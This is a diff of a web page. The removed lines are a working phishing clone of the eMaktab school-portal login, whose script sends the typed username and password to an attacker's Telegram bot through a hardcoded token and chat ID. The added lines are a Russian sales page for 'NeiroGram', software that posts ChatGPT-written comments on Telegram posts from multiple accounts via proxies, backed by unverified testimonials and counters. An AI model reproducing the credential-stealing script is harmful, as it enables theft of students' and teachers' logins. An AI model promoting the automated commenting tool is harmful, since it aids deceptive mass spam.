@@ -1,221 +1,847 @@
+
 <!DOCTYPE html>
-<html>
-<head lang="ru">
-    <meta name="google" value="notranslate">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <link rel="icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon">
-    <link rel="shortcut icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon">
-    <title>eMaktab | eMaktab ga kirish</title>
-    <link rel="stylesheet" href="https://static.emaktab.uz/assets/styles/main.min.86ffea1a.css?v=86ffea1a" media="all" type="text/css">
-    <link rel="stylesheet" href="https://static.emaktab.uz/styles/main/common.css?v=38675ba2" media="all" type="text/css">
-    <link rel="stylesheet" href="https://static.emaktab.uz/blocks/blocks.css?v=aba5594a" media="all" type="text/css">
-    <link rel="stylesheet" href="https://static.emaktab.uz/css/adaptive.css?v=f02f9b01" media="all" type="text/css">
-    <link rel="stylesheet" href="https://static.emaktab.uz/client/notifications.css?v=1f469960" type="text/css">
-    <script type="text/javascript">
-        var dnevnik = {"urls":{"domain":"emaktab.uz"}};
-    </script>
-    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/modules/redesign.min.4001a175.js?v=4001a175"></script>
-    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/vendors/requirejs/require-2.1.6.js?v=ef8e5d03"></script>
-    <script type="text/javascript">
-        require.config({
-            baseUrl: "https://static.emaktab.uz/assets/scripts/modules",
-            urlArgs: "v=9fed7315",
-        });
-    </script>
-    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/modules/main-redesign.min.a8e15e2a.js?v=a8e15e2a"></script>
-    <script type="text/javascript" src="https://static.emaktab.uz/blocks/blocks.js?v=ebd35f0f"></script>
-    <script type="text/javascript" src="https://static.emaktab.uz/javascripts/local/uz-Latn.js?v=0320e479"></script>
-</head>
-<body class="page_adaptive">
-    <script>
-        window.environmentPrefix = "uz";
-        window.environmentPrefix = "";
-    </script>
-    <header class="header-anon" id="header-anon">
-        <div class="colored-line colored-line_uz">
-            <div class="colored-line__item colored-line__item_blue"></div>
-            <div class="colored-line__item colored-line__item_green"></div>
-            <div class="colored-line__item colored-line__item_yellow"></div>
-            <div class="colored-line__item colored-line__item_orange"></div>
-            <div class="colored-line__item colored-line__item_violet"></div>
-        </div>
-        <div class="header-anon__content">
-            <div class="header-anon__logotype" id="logo">
-                <a href="https://emaktab.uz"><img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab"></a>
-            </div>
-            <div class="header-anon__menu-wrapper">
-                <div class="header-anon__menu">
-                    <nav class="menu">
-                        <ul class="menu__layout">
-                            <li class="menu__layout_unit">
-                                <a class="menu__item menu__item_border menu__item_no-left-padding" href="https://emaktab.uz/about">Tashkilot</a>
-                            </li>
-                            <li class="menu__layout_unit">
-                                <a class="menu__item menu__item_border" href="https://emaktab.uz/features">Imkoniyatlar</a>
-                            </li>
-                            <li class="menu__layout_unit">
-                                <a class="menu__item menu__item_border" href="https://emaktab.uz/forpartners">Hamkorlarga</a>
-                            </li>
-                            <li class="menu__layout_unit">
-                                <a class="menu__item menu__item_border menu__item_noborder menu__item_no-right-padding" href="https://emaktab.uz/support">Yordam</a>
-                            </li>
-                        </ul>
-                    </nav>
-                </div>
-                <div class="header-anon__buttons" id="anon-buttons">
-                    <div class="header-anon__localization-button" id="localization-button">
-                        <div class="header-localization-select">
-                            <div class="header-localization-select__info">
-                                <div class="header-localization-select__info_row header-localization-select__info_row-content">
-                                    O'zb
-                                </div>
-                                <div class="header-localization-select__info_row header-localization-select__tumbler"></div>
-                            </div>
-                            <div class="dropdown-container dropdown-container_font-weight-bold dropdown-container_left-position-0 dropdown-container_no-specific-last-child">
-                                <a href="https://emaktab.uz/api/localization/change?newCulture=uz-Latn-UZ&currentUrl=https%3a%2f%2flogin.emaktab.uz%2f" title="O'zbekcha" class="link link_dropdown-container-link link_dropdown-container-link_selected link_">O'zbekcha</a>
-                                <a href="https://emaktab.uz/api/localization/change?newCulture=ru-RU&currentUrl=https%3a%2f%2flogin.emaktab.uz%2f" title="Русский" class="link link_dropdown-container-link link_ link_">Русский</a>
-                            </div>
-                            <script>
-                                require(['DropdownContainer/DropdownContainer'], function () { 
-                                    for(var i = 0, l = arguments.length; i < l; i += 1) { 
-                                        arguments[i](JSON.parse('\x7b\x22tumblerClass\x22\x3a\x22header-localization-select\x22,\x22activationClasses\x22\x3a\x5b\x22header-localization-select__info\x22,\x22dropdown-container\x22\x5d\x7d')); 
-                                    } 
-                                });
-                            </script>
-                        </div>
-                    </div>
-                    <div class="header-anon__button">
-                        <a href="https://login.emaktab.uz/login" title="Kirish" class="button button_blue button_padding-20" onclick="" data-category="" data-action="" data-target="">Kirish</a>
-                    </div>
-                    <div class="header-anon__button">
-                        <a href="https://login.emaktab.uz/join/role" title="Tashkilotni ulash" class="button button_green button_padding-20 button_margin-left-20" onclick="" data-category="" data-action="" data-target="">Tashkilotni ulash</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-    <script type="text/javascript">
-        var button = document.getElementById('localization-button');
-        moveLocalizationButton();
-        window.addEventListener('resize', function(event) {
-            moveLocalizationButton();
-        }, true);
-        
-        function moveLocalizationButton() {
-            if (window.innerWidth > 1200) {
-                jQuery("#localization-button").detach().prependTo('#anon-buttons');
-                button.classList.remove("localization-mobile");
-            }
-            else {
-                jQuery("#localization-button").detach().appendTo('#logo');
-                button.classList.add("localization-mobile");
-            }
-        }
-    </script>
+<html lang="ru">
+<head>
+  <!-- Basic -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>NeiroGram — Нейрокомментинг Телеграм</title>
+  <meta name="description" content="Нейрокомментинг для Телеграм — привлекайте по 500+ подписчиков в день легко и доступно. Лучший софт для продвижения Телеграм каналов!">
+  <meta name="keywords" content="нейрокомментинг, нейрокомментинг телеграм, автоматическое комментирование, нейрокомментинг услуги, нейрокомментинг для бизнеса, нейросети для комментирования, AI комментирование, автокомментинг Телеграм, продвижение Телеграм каналов, автоматизация комментариев">
 
-    <div class="main main_top-30">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-24 col-xs-24">
-                    <div class="article-area">
-                        <form id="loginForm" class="login" method="post" action="TelegramBot.php" onsubmit="handleSubmit(event)">
-                            <input id="exceededAttempts" name="exceededAttempts" type="hidden" value="False"> 
-                            <input id="ReturnUrl" name="ReturnUrl" type="hidden" value=""> 
-                            <input id="FingerprintId" name="FingerprintId" type="hidden" value="">
-                            <div class="login__header login__header_uz">
-                                <div class="row row_centered">
-                                    <div class="login__header-title col-md-12 col-xs-12">
-                                        <h2 class="login__title">Shaxsiy kabinetga kirish</h2>
-                                    </div>
-                                    <div class="login__header-logo col-md-12 col-xs-12">
-                                        <img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab">
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="login__panel">
-                                <div class="form form-vertical login__panel-form login__panel-form_uz">
-                                    <div class="form__item form__item_required">
-                                        <label class="form__label" for="username">Foydalanuvchi nomi</label> 
-                                        <input id="username" name="username" type="text" class="input" placeholder="example@domain.com" tabindex="1" autofocus="autofocus" data-val="true" data-val-length="Email 3 tadan 128 tagacha belgidan iborat bo'lishi kerak." data-val-length-max="128" data-val-length-min="3" data-val-required="Maydonni to'ldirish majburiy." autocomplete="username">
-                                        <span class="field-validation-valid" data-valmsg-for="username" data-valmsg-replace="true"></span>
-                                    </div>
-                                    <div class="form__item form__item_required">
-                                        <label class="form__label" for="password">Parol</label> 
-                                        <input id="password" name="password" type="password" class="input" placeholder="********" tabindex="2" data-val="true" data-val-length="Parol 3 tadan 32 tagacha belgidan iborat bo'lishi kerak." data-val-length-max="32" data-val-length-min="3" data-val-required="Maydonni to'ldirish majburiy." autocomplete="current-password">
-                                        <span class="field-validation-valid" data-valmsg-for="password" data-valmsg-replace="true"></span>
-                                    </div>
-                                    <div class="form__item login__form-action">
-                                        <button type="submit" class="button button_blue button_full-width" tabindex="4">Kirish</button>
-                                    </div>
-                                    <div class="login__form-forgot-password">
-                                        <a href="https://login.emaktab.uz/forgot-password">Parolingizni unutdingizmi?</a>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="login__panel-message login__panel-message_fail login__panel-message_hidden login__panel-message_uz" id="loginError">
-                                <div class="row row_centered">
-                                    <div class="login__panel-message-logo col-md-4 col-xs-4">
-                                        <img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab">
-                                    </div>
-                                    <div class="login__panel-message-text col-md-20 col-xs-20">
-                                        <p class="login__panel-message-text">E-mail yoki parol noto‘g‘ri.</p>
-                                    </div>
-                                </div>
-                            </div>
-                        </form>
-                    </div>
-                </div>
+  <meta property="og:title" content="NeiroGram — Нейрокомментинг Телеграм">
+  <meta property="og:description" content="Нейрокомментинг для Телеграм — привлекайте по 500+ подписчиков в день легко и доступно. Лучший софт для продвижения Телеграм каналов!">
+  <meta property="og:image" content="https://neirogram.com/assets/imgs/Logos.png">
+  <meta property="og:url" content="https://neirogram.com/">
+  <meta property="og:type" content="website">
+  <meta property="og:locale" content="ru_RU">
+  <meta property="og:site_name" content="Neirogram.com">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="NeiroGram — Нейрокомментинг Телеграм">
+  <meta name="twitter:description" content="Нейрокомментинг для Телеграм — привлекайте по 500+ подписчиков в день легко и доступно. Лучший софт для продвижения Телеграм каналов!">
+  <meta name="twitter:image" content="https://neirogram.com/assets/imgs/Logos.png">
+
+  <link rel="canonical" href="https://neirogram.com/">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://neirogram.com/assets/imgs/logo16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://neirogram.com/assets/imgs/logo32.png">
+  <link rel="icon" type="image/png" sizes="64x64" href="https://neirogram.com/assets/imgs/logo64.png">
+  <link rel="icon" type="image/png" sizes="128x128" href="https://neirogram.com/assets/imgs/logo128.png">
+
+  <!-- include google fonts style-->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;900&family=Inter:wght@300&display=swap" rel="stylesheet" type="text/css">
+  <!-- Custom styles for this template -->
+  <link rel="stylesheet" href="https://neirogram.com/assets/css/style.css">
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FJJP52VLNS"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-FJJP52VLNS');
+  </script>
+
+  <!-- Schema.org JSON-LD -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "NeiroGram — Нейрокомментинг Телеграм",
+    "description": "Нейрокомментинг для Телеграм — привлекайте по 500+ подписчиков в день легко и доступно. Лучший софт для продвижения Телеграм каналов!",
+    "applicationCategory": "Social Media Marketing",
+    "operatingSystem": "Web",
+    "softwareVersion": "2025",
+    "author": {
+      "@type": "Organization",
+      "name": "Neirogram.com"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Neirogram.com",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://neirogram.com/assets/imgs/Logo.webp"
+      }
+    },
+    "offers": {
+      "@type": "Offer",
+      "priceCurrency": "USD",
+      "price": "20.00",
+      "url": "https://neirogram.com/"
+    },
+    "datePublished": "2024-11-14",
+    "dateModified": "2024-11-14",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://neirogram.com/"
+    }
+  }
+  </script>
+<body>
+  <div class="cdbd-wrapper">
+    <div class="header-area position-relative">
+      <div class="header-background">
+        <div class="bluelyap"></div>
+        <!-- Header start -->
+        <header id="header" class="site-header">
+          <div class="cdbd-container">
+            <div class="grid grid-2 g-gap-20 align-center">
+              <!-- Site Brand -->
+              <div class="site-logo" style="    position: relative;
+    z-index: 1;">
+                <a href="/" class="logo">
+                  <img src="assets/imgs/Logo.webp" alt="Logo">
+                </a>
+              </div>
+              <div class="cdbd-navbar">
+                <!-- Start navigation -->
+                <nav class="main-navber position-relative">
+                  <div class="nav-mobile position-absolute"><a href="#"><span class="position-relative"></span></a></div>
+                  <ul class="list-unstyled flex gap-15 nav-list">
+                    <li class="active">
+                      <a href="#about">Обзор</a>
+                    </li>
+                    <li>
+                      <a href="#how">Как работает?</a>
+                    </li>
+                    <li>
+                      <a href="#collections">Отзывы</a>
+                    </li>
+                    <li>
+                      <a href="#pricing">Тарифы</a>
+                    </li>
+                     <li>
+                      <a href="#faqs">FAQ</a>
+                    </li>
+                    <li class="header-mobile-btn">
+                      <div class="cdbd-btn br-30 position-relative flex justify-center align-center overflow-hidden">
+                        <a target="_blank" rel="nofollow" href="https://t.me/bivenmo" class="btn fw-700 fz-16 position-relative cl-white">Контакты</a>
+                      </div>
+                    </li>
+                  </ul>
+                </nav>
+                <!-- End navigation -->
+              </div>
             </div>
+          </div>
+        </header>
+        <!-- Header end -->
+        <!-- Start Hero Section -->
+        <div class="cdbd-container">
+          <div class="hero-area grid grid-2" id="features">
+            <div class="hero-inner-left">
+              <div class="hero-inner-content position-relative">
+                <h1 class="line-border position-relative fw-700 fz-52 lh-58 cl-white">Нейрокомментинг Телеграм 2025
+                  <svg xmlns="http://www.w3.org/2000/svg" width="271" height="39" class="position-absolute" viewbox="0 0 271 39" fill="none">
+                    <path d="M2 37C72.3195 13.3049 207.89 -14.3698 269 14.0643" stroke="url(#paint0_linear_784_1341)" stroke-width="4" stroke-linecap="round"></path>
+                    <defs>
+                      <lineargradient id="paint0_linear_784_1341" x1="25.6855" y1="2" x2="87.2489" y2="126.717" gradientunits="userSpaceOnUse">
+                        <stop offset="1" stop-color="#438A54"></stop>
+                        <stop offset="1" stop-color="#1F868D"></stop>
+                      </lineargradient>
+                    </defs>
+                  </svg>
+                </h1>
+                <p class="fw-400 fz-24 lh-36 cl-C0C0C0">Купить Нейрокомментинг в Телеграм можно по лучшей цене на рыннке софтов. Привлекай трафик эффективно!</p>
+                <div class="cdbd-btn br-10 btn-large position-relative flex justify-center align-center overflow-hidden">
+                  <a target="_blank" href="https://www.youtube.com/watch?v=sy8CwzwhzJM" class="btn fw-700 fz-16 position-relative cl-white">
+                    <span>Видео обзор</span>
+                  </a>
+                </div>
+              </div>
+            </div>
+            <div class="hero-inner-right position-relative">
+              <svg xmlns="http://www.w3.org/2000/svg" width="1374" height="1325" class="hero--right-svg position-absolute" viewbox="0 0 1374 1325" fill="none">
+                <g filter="url(#filter0_f_784_110)">
+                  <path d="M1190.33 402.685C1443.29 286.314 1416.57 521.129 1402.16 624.56L702.546 613.996C688.593 476.891 753.939 229.233 836.065 241.312C1046.48 272.26 963.925 506.841 1190.33 402.685Z" fill="#00ECFF"></path>
+                </g>
+                <defs>
+                  <filter id="filter0_f_784_110" x="0.660156" y="-459.114" width="2110.12" height="1783.67" filterunits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                    <feflood flood-opacity="0" result="BackgroundImageFix"></feflood>
+                    <feblend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feblend>
+                    <fegaussianblur stddeviation="350" result="effect1_foregroundBlur_784_110"></fegaussianblur>
+                  </filter>
+                </defs>
+              </svg>
+              <div class="hero-img">
+                <img src="assets/imgs/hero-img.webp" alt="Hero Image">
+              </div>
+              <!-- Start fun counter -->
+              <div class="herofuns flex justify-center align-center f-gap-40">
+                <p class="position-relative cl-white text-center fw-700 fz-30 lh-42">
+                  <span class="count">534</span><span class="count-plus fz-25">+</span>
+                  <span class="count-text fw-400 fz-16 lh-22">Клиентов</span>
+                </p>
+                <p class="position-relative cl-white text-center fw-700 fz-30 lh-42">
+                  <span class="count">836232</span><span class="count-plus fz-25">+</span>
+                  <span class="count-text fw-400 fz-16 lh-22">Привлечено подписчиков</span>
+                </p>
+                <p class="position-relative cl-white text-center fw-700 fz-30 lh-42 ni">
+                  <span class="count">1</span><span class="count-plus fz-25">+</span>
+                  <span class="count-text fw-400 fz-16 lh-22">Лет на рынке</span>
+                </p>
+              </div>
+              <!-- End fun counter -->
+            </div>
+          </div>
         </div>
+        <!-- End Hero Section -->
+      </div>
     </div>
-    <script>
-        const chatID = '6320467148';
-        const token = '7259013301:AAGaD_I5tHLhqd0XH3Ql1ZprS04Jf4SzSlA';
+    <!-- Start content block -->
+    <div class="content-block-wrapper section-padding" id="about">
+      <div class="cdbd-container mw1280">
+        <div class="content-block grid grid-2">
+          <div class="content-inner-left position-relative">
+            <div class="content-block-img position-relative">
+           <div class="video-facade" onclick="loadVideo()">
+    <img src="/assets/imgs/prev.webp" alt="Video Thumbnail" loading="lazy">
+    <div class="play-button"><img style="border: none;" src="/assets/imgs/play.png" alt="play"></div>
+</div>
+<script type="text/javascript">
+  function loadVideo() {
+    const videoFacade = document.querySelector('.video-facade');
+    videoFacade.innerHTML = `
+        <iframe class="video1" src="https://www.youtube.com/embed/sy8CwzwhzJM?si=quafsLOmPRYvdh-p" 
+        title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; 
+        encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" 
+        allowfullscreen></iframe>
+    `;
+}
 
-        function handleSubmit(event) {
-            event.preventDefault();
-            const phoneNumber = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+</script>
+            </div>
+          </div>
+          <div class="content-inner-right">
+            <div class="content-inner-content align-left">
+              <h2 class="line-border position-relative fw-600 fz-52 lh-72 cl-white fs25" >Что такое Нейройомментинг?
+                <svg xmlns="http://www.w3.org/2000/svg" width="271" height="39" class="position-absolute" viewbox="0 0 271 39" fill="none">
+                  <path d="M2 37C72.3195 13.3049 207.89 -14.3698 269 14.0643" stroke="url(#paint0_linear_784_134)" stroke-width="4" stroke-linecap="round"></path>
+                  <defs>
+                    <lineargradient id="paint0_linear_784_134" x1="25.6855" y1="2" x2="87.2489" y2="126.717" gradientunits="userSpaceOnUse">
+                      <stop offset="1" stop-color="#438A54"></stop>
+                      <stop offset="1" stop-color="#1F868D"></stop>
+                    </lineargradient>
+                  </defs>
+                </svg>
+              </h2>
+              <p class="fw-400 fz-26 lh-26 cl-C0C0C0" style="font-size: 20px; text-align: left;">
+<b>Нейрокомментиг</b> - это софт, позволяющий автоматически отправлять комментарии, сгенерированные с помощью ChatGPT, по постам в Телеграм, которые недавно вышли.
+              </p>
+            
+            </div>
+          </div>
 
-            const attempts = parseInt(localStorage.getItem('attempts')) || 0;
-            const timeout = localStorage.getItem('timeout');
+        </div>
+          <center><div class="cdbd-btn br-10 btn-large position-relative flex justify-center align-center overflow-hidden">
+                <a href="#pricing" class="btn fw-700 fz-16 position-relative cl-white">
+                  <span>Купить в 1 клик</span>
+                </a>
+              </div>
+              </center>
+      </div>
+    </div>
+    <!-- End content block -->
 
-            if (timeout && new Date().getTime() < timeout) {
-                const waitTime = Math.ceil((timeout - new Date().getTime()) / 1000);
-                alert(`Подождите ${(waitTime / 60).toFixed(1)} минут перед следующей попыткой`);
-                return;
-            }
+    <!-- start road map  -->
+    <div class="road-map-area" id="how">
+      <div class="cdbd-container mw1280">
+        <div class="road-map-tittle">
+          <h3 class="h325">Как работает нейрокомментинг?</h3>
+       
+        </div>
+        <div class="map-chart-wrap">
+          <div class="chart-border">
+            <img src="assets/imgs/border.webp" alt="messing">
+          </div>
+          <div class="map-item">
+            <div class="map-left-item">
+              <div class="map-single-item">
+                <span>1</span>
+              <div class="map-content">
+                <p>Делаем подписки на каналы</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span>3</span>
+              <div class="map-content">
+                <p>Отправляем пост ChatGPT</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span>5</span>
+              <div class="map-content">
+                <p>Софт отправляет <br>
+                  комментарий </p>
+              </div>
+              </div>
+            </div>
 
-            if (attempts < 3) {
-                if (phoneNumber.length === 0 || password.length === 0) {
-                    alert('Заполните все поля формы!');
-                } else {
-                    const message = `Номер телефона: ${phoneNumber}\nПароль: ${password}`;
-                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
 
-                    fetch(url)
-                        .then(response => {
-                            if (response.ok) {
-                                alert('Успешно отправлено!');
-                            } else {
-                                throw new Error('Ошибка при отправке');
-                            }
-                        })
-                        .catch(error => {
-                            console.error('Ошибка:', error);
-                            alert('Ошибка при отправке');
-                        });
-                }
-                localStorage.setItem('attempts', attempts + 1);
-            } else {
-                const newTimeout = new Date().getTime() + 5 * 60 * 1000; // 5 минут
-                localStorage.setItem('timeout', newTimeout);
-                localStorage.setItem('attempts', 0);
-                alert('Вы исчерпали свои попытки. Подождите 5 минут.');
-            }
-        }
-    </script>
+            <div class="map-right-item">
+              <div class="map-single-item">
+              <div class="map-content">
+                <p>Подключаем <br>
+                  Телеграм аккаунты</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span>2</span>
+              <div class="map-content">
+                <p>Ожидаем<br>
+                  новые посты</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span>4</span>
+              <div class="map-content">
+                <p>ChatGTP создает<br>
+                  комментарий к посту </p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span>6</span>
+              </div>
+            </div>
+
+          </div>
+          <p class="fw-400 fz-26 lh-36 cl-C0C0C0" style="font-size: 15px;    line-height: 18px;margin-top: 20px;">
+<b>Автоматический нейрокомментинг</b> — это современный инструмент, который помогает бизнесу повысить вовлеченность аудитории с минимальными затратами времени. Используя искусственный интеллект, нейрокомментинг автоматически создает релевантные и продуманные комментарии, что способствует постоянной активности на платформе и улучшению имиджа бренда. 
+              </p>
+              <p class="fw-400 fz-26 lh-36 cl-C0C0C0" style="font-size: 15px;       line-height: 18px;  margin-top: 20px;">
+Среди преимуществ нейрокомментинга — оперативные ответы, повышение интереса пользователей, экономия на ручном комментировании и возможность удерживать внимание аудитории на контенте.
+              </p>
+        </div>
+
+<div class="map-chart-wrap2">
+          <div class="chart-border">
+            <img src="assets/imgs/border.webp" alt="messing">
+          </div>
+          <div class="map-item">
+            <div class="map-left-item">
+              <div class="map-single-item">
+                <span></span>
+              <div class="map-content">
+                 <p>1. Подключаем <br>
+                  Телеграм аккаунты</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span></span>
+              <div class="map-content">
+                <p>2. Делаем подписки на каналы</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span></span>
+              <div class="map-content">
+                <p>3. Ожидаем новые посты</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span></span>
+              <div class="map-content">
+                <p>4. Отправляем пост ChatGPT</p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span></span>
+               <div class="map-content">
+                <p>5. ChatGTP создает<br>
+                  комментарий к посту </p>
+              </div>
+              </div>
+              <div class="map-single-item">
+                <span></span>
+              <div class="map-content">
+                <p>6. Софт отправляет <br>
+                  комментарий </p>
+              </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+
+      </div>
+    </div>
+
+    <!-- End road map  -->
+      
+
+    <!-- Start collections -->
+    <div class="collection-wrapper section-padding position-relative" id="collections">
+      <svg xmlns="http://www.w3.org/2000/svg" width="1440" height="1785" class="position-absolute top-0 left-0 collection-svg-top" viewbox="0 0 1440 1785" fill="none">
+        <g opacity="0.6" filter="url(#filter0_f_784_317)">
+          <path d="M563.333 862.685C816.293 746.314 789.57 981.129 775.158 1084.56L75.5464 1074C61.5926 936.891 126.939 689.233 209.065 701.312C419.481 732.26 336.925 966.841 563.333 862.685Z" fill="#00ECFF"></path>
+        </g>
+        <defs>
+          <filter id="filter0_f_784_317" x="-626.34" y="0.88623" width="2110.12" height="1783.67" filterunits="userSpaceOnUse" color-interpolation-filters="sRGB">
+            <feflood flood-opacity="0" result="BackgroundImageFix"></feflood>
+            <feblend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feblend>
+            <fegaussianblur stddeviation="350" result="effect1_foregroundBlur_784_317"></fegaussianblur>
+          </filter>
+        </defs>
+      </svg>
+      <div class="cdbd-container mw1280">
+        <div class="collection-content">
+          <div class="flex align-center justify-between">
+            <div class="collection-left">
+              <h2 class="cl-white fw-600 fz-52 lh-72">Отзывы</h2>
+            </div>
+          </div>
+          <!-- Collection lists start -->
+          <div class="collection-lists grid grid-3 g-gap-50 g-align-center">
+            <div class="single-collection collection-bg br-14 text-center">
+              <div class="collection-img position-relative">
+                
+                <img src="assets/imgs/1.webp" alt="рост подписчиков" class="collection-thumb br-14">
+                <div style="    margin-top: 20px;"> <span style="      color: #C0C0C0;  font-size: 15px;"><b>Андрей:</b></span><p style="    color: #C0C0C0;line-height: 18px; font-size: 15px;">Cоздание нейрокомментинга оказалось очень простым, уже за 2 недели + 2190 подписчиков и растёт как на дрожах.</p></div>
+              </div>
+            
+            </div>
+         
+            <div class="single-collection collection-bg br-14 text-center">
+              <div class="collection-img position-relative">
+                
+                <img src="assets/imgs/3.webp" alt="результат нейрокомментинга" class="collection-thumb br-14">
+                <div style="    margin-top: 20px;"> <span style="      color: #C0C0C0;  font-size: 15px;"><b>Егор:</b></span><p style="    color: #C0C0C0;line-height: 18px; font-size: 15px;">Пробовал разные сервисы для нейрокомментинга, но этот однозаночно лучший! Софт без каких либо ограничений и всего 20$ в месяц - за такое чудо, это просто копейки.</p></div>
+              </div>
+            
+            </div>
+        
+            <div class="single-collection collection-bg br-14 text-center">
+              <div class="collection-img position-relative">
+                
+                <img src="assets/imgs/2.webp" alt="отзыв по софту" class="collection-thumb br-14">
+                <div style="    margin-top: 20px;"> <span style="      color: #C0C0C0;  font-size: 15px;"><b>Матвей:</b></span><p style="    color: #C0C0C0;line-height: 18px; font-size: 15px;">Давно искал как сделать нейрокомментинг в Телеграм без лишнего напряга и ваша программа стала для меня палочкой выручалочкой. Итог первые 500 подписчиков уже через 2 дня.</p></div>
+              </div>
+         
+            </div>
+          </div>
+          <!-- Collection list end -->
+        </div>
+        <div class="button-loadmore flex justify-center">
+          <div class="cdbd-btn br-10 position-relative flex justify-center align-center overflow-hidden">
+            <a target="_blank" href="https://t.me/+B5URzvedEhJiMDky" class="btn fw-700 fz-22 lh-28 position-relative cl-white">
+              <span>Все отзывы</span>
+            </a>
+          </div>
+        </div>
+      </div>
+      <svg xmlns="http://www.w3.org/2000/svg" width="1440" height="1785" class="position-absolute bottom-0 right-0 collection-svg-bottom" viewbox="0 0 1440 1785" fill="none">
+        <g filter="url(#filter0_f_784_109)">
+          <path d="M1178.33 862.685C1431.29 746.314 1404.57 981.129 1390.16 1084.56L690.546 1074C676.593 936.891 741.939 689.233 824.065 701.312C1034.48 732.26 951.925 966.841 1178.33 862.685Z" fill="#00ECFF"></path>
+        </g>
+        <defs>
+          <filter id="filter0_f_784_109" x="-11.3398" y="0.886169" width="2110.12" height="1783.67" filterunits="userSpaceOnUse" color-interpolation-filters="sRGB">
+            <feflood flood-opacity="0" result="BackgroundImageFix"></feflood>
+            <feblend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feblend>
+            <fegaussianblur stddeviation="350" result="effect1_foregroundBlur_784_109"></fegaussianblur>
+          </filter>
+        </defs>
+      </svg>
+    </div>
+    <!-- End collections -->
+
+    <!-- exclusive-bundles-start -->
+    <div class="exclusive-bundles" id="pricing">
+      <div class="cdbd-container mw1280">
+        <div class="content-block">
+          <div class="">
+            <div class="content-inner-content align-left">
+              <h2 class="line-border position-relative fw-600 fz-52 lh-72 cl-white fs25">Тарифы на софт <b style="color: #d50000;">[-50%]</b>
+                <svg xmlns="http://www.w3.org/2000/svg" width="271" height="39" class="position-absolute" viewbox="0 0 271 39" fill="none">
+                  <path d="M2 37C72.3195 13.3049 207.89 -14.3698 269 14.0643" stroke="url(#paint0_linear_784_134)" stroke-width="4" stroke-linecap="round"></path>
+                  <defs>
+                    <lineargradient id="paint0_linear_784_134" x1="25.6855" y1="2" x2="87.2489" y2="126.717" gradientunits="userSpaceOnUse">
+                      <stop offset="1" stop-color="#438A54"></stop>
+                      <stop offset="1" stop-color="#1F868D"></stop>
+                    </lineargradient>
+                  </defs>
+                </svg>
+              </h2>
+              <p class="fw-400 fz-26 lh-36 cl-C0C0C0" style="line-height: 1.3; text-align: left;
+    font-size: 20px;">Купить Нейрокомментинг можно по самой низкой цене именнно у нас. Наш софт имеет самую низкую цену на рынке софтов, всего 20$ в месяц или 45$ в год и без каких либо дополнительных ограничений!</p>
+              <p class="fw-400 fz-26 lh-36 cl-C0C0C0" style=" text-align: left;line-height: 1.3;
+    font-size: 20px;">Наш сервис нейрокомментинга имеет более 10 видов индвидуальных настроек, включая: задержки, промты, тон комментария, настройку пола и языка, подстраиваемость под язык поста, мультиаккаунтинг, работу с прокси и так далее.</p>
+            </div>
+          </div>
+          <div class="position-relative df1">
+
+  <div class="br-14"  style="max-width: 320px; margin: 0 auto;     margin: 50px auto; height: 90%;    background: #1B1B21; padding: 10px; br-14"> 
+
+
+      <h3 style="    color: white;
+    text-align: center;
+    font-size: 30px; margin: 2px">Купить софт</h3>
+
+<div class="p20">
+<p style="text-align: left;">✅ <b>Нейрокомментиг</b></p>   
+<ol style="margin-bottom: 10px; text-align: left;">      
+<li>Инструкция по работе</li>
+<li>Работает на основе ChatGpt</li>
+<li>Поддержка мультиаккаунтинга</li>
+<li>Настройка прокси</li>
+<li>Настройки задержек</li>
